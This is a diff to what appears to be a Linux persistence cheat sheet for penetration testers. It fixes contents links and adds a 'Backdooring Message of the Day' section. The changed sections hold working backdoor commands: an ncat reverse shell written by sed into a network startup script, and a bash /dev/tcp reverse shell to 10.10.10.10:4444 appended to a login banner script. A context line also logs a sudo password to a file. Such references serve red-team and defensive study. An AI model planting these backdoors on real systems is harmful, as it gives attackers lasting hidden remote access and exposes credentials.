@@ -5,10 +5,11 @@
 * [Basic reverse shell](#basic-reverse-shell)
 * [Add a root user](#add-a-root-user)
 * [Suid Binary](#suid-binary)
-* [Crontab - Reverse shell](#crontab-reverse-shell)
-* [Backdooring a user's bash_rc](#backdooring-an-users-bash-rc)
-* [Backdooring a startup service](#backdoor-a-startup-service)
-* [Backdooring a user startup file](#backdooring-an-user-startup-file)
+* [Crontab - Reverse shell](#crontab---reverse-shell)
+* [Backdooring a user's bash_rc](#backdooring-a-users-bash_rc)
+* [Backdooring a startup service](#backdooring-a-startup-service)
+* [Backdooring a user startup file](#backdooring-a-user-startup-file)
+* [Backdooring Message of the Day](#backdooring-message-of-the-day)
 * [Backdooring a driver](#backdooring-a-driver)
 * [Backdooring the APT](#backdooring-the-apt)
 * [Backdooring the SSH](#backdooring-the-ssh)
@@ -90,10 +91,20 @@ echo $sudopass >> /tmp/pass.txt
 
 ## Backdooring a startup service
 
-```bash
-RSHELL="ncat $LMTHD $LHOST $LPORT -e \"/bin/bash -c id;/bin/bash\" 2>/dev/null"
-sed -i -e "4i \$RSHELL" /etc/network/if-up.d/upstart
-```
+* Edit `/etc/network/if-up.d/upstart` file
+  ```bash
+  RSHELL="ncat $LMTHD $LHOST $LPORT -e \"/bin/bash -c id;/bin/bash\" 2>/dev/null"
+  sed -i -e "4i \$RSHELL" /etc/network/if-up.d/upstart
+  ```
+
+
+## Backdooring Message of the Day
+
+* Edit `/etc/update-motd.d/00-header` file
+  ```bash
+  echo 'bash -c "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"' >> /etc/update-motd.d/00-header
+  ```
+
 
 ## Backdooring a user startup file
 
